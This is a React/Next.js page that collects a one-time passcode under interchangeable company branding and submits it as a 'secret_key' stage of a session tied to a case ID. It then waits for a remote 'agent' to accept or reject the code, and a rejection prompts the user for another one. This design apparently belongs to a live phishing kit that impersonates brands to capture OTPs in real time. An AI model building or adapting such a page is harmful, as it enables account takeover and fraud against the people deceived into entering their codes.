'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore, submitStageData } from '@shared';
import { currentBrand } from '@/config/branding';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { status, caseId, agentMessage } = useSessionStore();
  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter a valid OTP');
        return;
      }

      setIsSubmitting(true);

      const success = await submitStageData(
        sessionUuid,
        'secret_key',
        { secret_key: secretKey.trim() },
        caseId,
        () => setIsSubmitting(true),
        () => setIsSubmitting(false)
      );

      if (!success) {
        setFieldError('Unable to process your code. Please try again.');
      }
    },
    [secretKey, caseId, sessionUuid]
  );

  if (status === 'waiting') {
    return (
      <div className="min-h-screen bg-[#fbfbfb] px-5 py-8">
        <div className="max-w-md mx-auto text-center">
          <div className="text-center mb-12">
            <img
              src={currentBrand.logo}
              alt={currentBrand.companyName}
              className="w-56 h-auto mx-auto"
            />
          </div>
          <div className="py-12">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#036647] mx-auto"></div>
            <p className="mt-4 text-gray-600">Verifying your OTP...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#fbfbfb] px-5 py-8">
      <div className="max-w-md mx-auto">
        {/* Logo */}
        <div className="text-center mb-12">
          <img
            src={currentBrand.logo}
            alt={currentBrand.companyName}
            className="w-56 h-auto mx-auto"
          />
        </div>

        {/* OTP Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <div className={`border-b ${fieldError ? 'border-red-500' : 'border-gray-300'}`}>
              <label
                htmlFor="otp"
                className="block text-sm text-[#036647] mb-2"
              >
                Enter the OTP sent to your email/phone
              </label>
              <input
                type="text"
                id="otp"
                value={secretKey}
                onChange={(e) => setSecretKey(e.target.value)}
                className="w-full bg-transparent border-none outline-none pb-3 text-base"
                placeholder="OTP"
                disabled={isSubmitting}
                required
              />
            </div>
            {fieldError && (
              <div className="invalid-feedback" style={{ display: 'block' }}>
                {fieldError}
              </div>
            )}
          </div>

          {/* Submit Button */}
          <div className="pt-6">
            <button
              type="submit"
              disabled={!secretKey || isSubmitting}
              className={`w-full text-white font-medium text-lg uppercase tracking-wide transition-colors ${secretKey && !isSubmitting
                ? 'bg-[#036647] border-[#036647] shadow-[0_2px_2px_0_rgba(0,0,0,0.16)]'
                : 'bg-[#c4c4c4] border-[#c4c4c4]'
                }`}
              style={{
                padding: '0.375rem 0.75rem',
                borderWidth: '1px',
                borderStyle: 'solid',
                borderRadius: '0.25rem',
                fontSize: '1rem',
                fontWeight: 400,
                lineHeight: 1.5
              }}
            >
              {isSubmitting ? 'Verifying...' : 'Verify OTP'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
